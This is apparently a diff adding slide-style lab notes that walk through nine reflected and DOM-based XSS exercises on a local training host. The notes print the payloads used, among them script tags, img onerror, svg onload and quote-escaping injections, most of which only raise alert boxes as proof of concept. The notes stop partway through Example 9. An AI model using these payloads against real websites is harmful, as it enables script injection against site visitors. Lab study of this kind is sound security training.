@@ -1,0 +1,138 @@
+XSS
+1
+XSS
+Example 1:
+URL: http://192.168.1.3/xss/example1.php?name=hacker
+Alert:
+URL: http://192.168.1.3/xss/example1.php?name=<script>alert(1)</script>
+
+XSS
+2
+Getting the domian:
+No cookies are used in the application so as a poc we will exfiltrate the document.domain :
+Payload:
+<img src=AAAAAAAAA onerror=alert(document.domain) />
+URL: http://192.168.1.3/xss/example1.php?name=<img src=AAAAAAAAA 
+onerror=alert(document.domain) />
+
+XSS
+3
+Example 2:
+URL: http://192.168.1.3/xss/example2.php?name=hacker
+HTML Injection:
+URL: http://192.168.1.3/xss/example2.php?name=<b>alert(1)</b>
+
+XSS
+4
+Alert:
+Payload:
+<SCRIPT>alert(1)</SCRIPT>
+URL: http://192.168.1.3/xss/example2.php?name=<SCRIPT>alert(1)</SCRIPT>
+Getting the domian:
+No cookies are used in the application so as a poc we will exfiltrate the document.domain :
+Payload:
+
+XSS
+5
+<img src=AAAAAAAAA onerror=alert(document.domain) />
+URL: http://192.168.1.3/xss/example2.php?name=<img src=AAAAAAAAA 
+onerror=alert(document.domain) />
+Example 3:
+URL: http://192.168.1.3/xss/example3.php?name=hacker
+
+XSS
+6
+HTML Injection:
+URL: http://192.168.1.3/xss/example3.php?name=<b>alert(1)</b>
+Alert:
+Payload:
+<img src=AAAAAAAAA onerror=alert(1) />
+
+XSS
+7
+Getting the Domain:
+Payload:
+<img src=AAAAAAAAA onerror=alert(document.domain) />
+
+XSS
+8
+Example 4:
+URL: http://192.168.1.3/xss/example4.php?name=hacker
+I noticed that the payload:
+<img src=AAAAAAAAA onerror=alert(document.domain) />
+Always works, so I took a whitebox approach.
+
+XSS
+9
+Payload:
+<svg/onload=alert('1')>
+
+XSS
+10
+Example 5:
+URL: http://192.168.1.3/xss/example5.php?name=hacker
+
+XSS
+11
+We will use script tags and an alert alternative.
+Payload:
+window.confirm('xss')
+URL: http://192.168.1.3/xss/example5.php?name=<script>window.confirm('xss')
+</script>
+
+XSS
+12
+Example 6:
+URL: http://192.168.1.3/xss/example6.php?name=hacker
+
+XSS
+13
+
+XSS
+14
+Payload:
+</script><script>alert(1)</script>
+Example 7:
+
+XSS
+15
+URL: http://192.168.1.3/xss/example7.php?name=hacker
+We will escape the quotes and be in the context of JS:
+Payload1:
+http://192.168.1.3/xss/example7.php?name=';alert(1)
+
+XSS
+16
+Payload2:
+http://192.168.1.3/xss/example7.php?name=';alert(1)'
+Payload3:
+
+XSS
+17
+http://192.168.1.3/xss/example7.php?name=%27;alert(1);%27
+Example 8:
+URL: http://192.168.1.3/xss/example8.php
+
+XSS
+18
+
+XSS
+19
+After some trial and error I ended up on ‘reflecting’ the payload
+Payload:
+"/><script>alert(1)</script>
+in the URL.
+
+XSS
+20
+Example 9:
+URL: http://192.168.1.3/xss/example9.php#hacker
+
+XSS
+21
+We have to perform a DOM-Based XSS.
+For this we need an old/vulnerable browser.
+We will use Windows 7 internet explorer.
+
+XSS
+22
